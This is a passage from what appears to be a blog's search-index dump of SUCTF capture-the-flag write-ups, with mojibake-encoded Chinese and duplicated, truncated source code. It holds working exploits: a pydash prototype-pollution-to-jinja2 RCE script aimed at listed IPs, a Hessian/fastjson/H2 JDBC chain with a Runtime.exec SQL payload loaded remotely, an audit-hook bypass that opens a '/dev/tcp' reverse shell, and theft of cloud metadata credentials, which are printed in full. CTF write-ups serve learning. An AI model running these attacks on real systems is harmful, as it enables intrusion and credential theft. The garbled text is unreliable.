in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, 